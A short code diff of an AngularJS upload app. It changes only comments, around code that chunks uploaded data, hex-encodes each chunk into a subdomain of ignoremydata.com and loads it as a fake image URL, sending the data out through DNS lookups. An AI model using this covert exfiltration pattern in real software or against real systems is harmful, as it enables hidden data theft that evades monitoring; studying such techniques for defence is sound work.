@@ -4,7 +4,7 @@ var pcApp = angular.module('pcApp', ['ngFileUpload']);
 
 var getUID = function(size) {
     // create a randon string of length N
-    // default = 5
+    // default = 6 ~ 1Billion unique combinations
     size = size || 6;
 
     // AAH, the uid is case insensitive, owing to oddnesses of DNS
@@ -107,12 +107,17 @@ pcApp.controller('formController', ['$scope', 'Upload', '$timeout', function ($s
 		var blocks = data.match( /[\s\S]{1,31}/g );
 		for( var block in blocks ) {
             var idx = block;
-            idx ++ ;
+            idx ++ ; // 1 based cointing..
 			// var s = Hexdump.fulldump( blocks[block] ) ;
 			var s = Hexdump.dump( blocks[block] ) +
             '.'+ idx +'.'+ uid +'.ignoremydata.com' ;
 
-            // now use that to generate a fake image url
+            // now use that string to generate a fake image url
+
+            // the original code used the 'dig' command which is blocking
+            // and has a slightly higher guarantee of getting the packet
+            // to the endpoint. some sort of wait loop here may be required
+
             var iurl = "http://"+s+"/favico.jpg";
             dummyImg.src = iurl;
 
